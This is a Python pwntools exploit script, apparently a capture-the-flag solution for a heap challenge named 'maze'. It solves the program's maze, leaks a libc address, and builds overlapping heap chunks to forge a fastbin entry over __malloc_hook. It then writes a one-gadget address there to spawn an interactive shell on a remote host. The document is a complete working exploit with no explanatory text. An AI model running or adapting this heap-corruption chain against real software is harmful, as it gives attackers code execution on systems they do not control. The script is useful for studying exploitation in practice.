from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./maze")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./maze")
else:
	p = remote("172.16.9.22",9010)
	libc = ELF("./libc-2.23.so")
	elf = ELF("./maze")

def menu(choice):
	p.sendlineafter("> ",str(choice))

def go():
	menu(0)

def add(name,op):
	menu(1)
	p.sendlineafter("what's your name?\n",name)
	p.sendlineafter("input you ops count\n",str(len(op) + 1))
	p.sendlineafter("ops: ",op)

def load(index):
	menu(2)
	p.sendlineafter("index?\n",str(index))

def store(size,content,add_ = True):
	menu(3)
	if add_:
		p.sendafter("any comment?\n","y")
		p.sendlineafter("comment size?\n",str(size))
		p.sendafter("plz input comment\n",content)
	else:
		p.sendafter("any comment?\n","n")

def free(index):
	menu(4)
	p.sendlineafter("index?\n",str(index))

def show():
	menu(5)

def show_game():
	menu(9)

def exit_():
	menu(6)


path = ""
width = 44
height = 44
targetx = 41
targety = 42
flag = [[0 for i in range(width)]for j in range(height)]
#print flag
path_cal = ""
def maze(x,y):
	#print x,y,y + 1 < width
	#print info[x]
	global path,flag,path_cal
	if x == targetx and y == targety:
		print path
		path_cal = path
		return True
	if x + 1 < height - 1 and info[x + 1][y] != "x" and flag[x + 1][y] == 0:
	#	print info[x + 1][y]
		path += "s"
		flag[x + 1][y] = 1
		maze(x + 1,y)
		flag[x + 1][y] = 0
		path = path[:-1]
	if x != 0 and info[x - 1][y] != "x" and flag[x - 1][y] == 0:
		path += "w"
		flag[x - 1][y] = 1
                maze(x - 1,y)
		flag[x - 1][y] = 0
                path = path[:-1]
	if y != 0 and info[x][y - 1] != "x" and flag[x][y - 1] == 0:
		path += "a"
		flag[x][y - 1] = 1
                maze(x,y - 1)
		flag[x][y - 1] = 0
                path = path[:-1]
	if y + 1 < width - 1 and info[x][y + 1] != "x" and flag[x][y + 1] == 0:
		path += "d"
		flag[x][y + 1] = 1
                maze(x,y + 1)
		flag[x][y + 1] = 0
                path = path[:-1]

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xE78)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
show_game()
p.recvuntil(" start(")
x = int(p.recvuntil(",",drop = True))
y = int(p.recvuntil(")",drop = True))
p.recvuntil("end(")
targetx = int(p.recvuntil(",",drop = True))
targety = int(p.recvuntil(")",drop = True))
p.recvline()
info2 = []
info = p.recvuntil("0. resume\n",drop = True)
for i in info.split("\n"):
	info2.append(i)
info = info2
maze(2,1)
path = path_cal
print path
add("aaaa",path)
p.recvuntil("Here's the award:")
leak_addr = int(p.recvuntil("\n",drop = True),16)
libc.address = leak_addr - libc.symbols["malloc"]
log.success("libc_base:" + hex(libc.address))
#debugf()
store(0xa0,"a" * 0xa0)
add("aaa","a")
free(0)
add("aaa","a")
size = 0x208
store(size,"a" + "\n") #0
add("aaa","a")
store(size,"a" * 0x200 + p64(0x210)) #1
add("aaa","a")
store(0x68,"a\n") #2
free(0)
add("aaa","a")
store(0x2f0,"a\n") #0
free(2)
add("aaa","a")
store(0x68,"a" * 0x60 + p64(0x470)) #2
#free(1)
#debugf()
#free(1)
free(0)
free(2)
add("aaa","a")
payload = "a" * 0x1 + p64(0) + p64(0x71) + p64(0x2)
store(0x200,payload + "\n")
add("aaa","a")
payload = "a" * 0x8 + p64(0) + p64(0x71) + p64(0x2)
store(0x1a0,payload + "\n")
add("aaa","a")
payload = "a" * 0x8 + p64(0) + p64(0x71) + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23)
store(0x200,payload + "\n")
debugf()
add("aaa","a")
store(0x68,payload + "\n")
add("aaa","a")
payload = "aaa" + p64(0) * 2 + p64(libc.address + 0xf02a4)
store(0x68,payload + "\n")
free(5)
p.interactive()
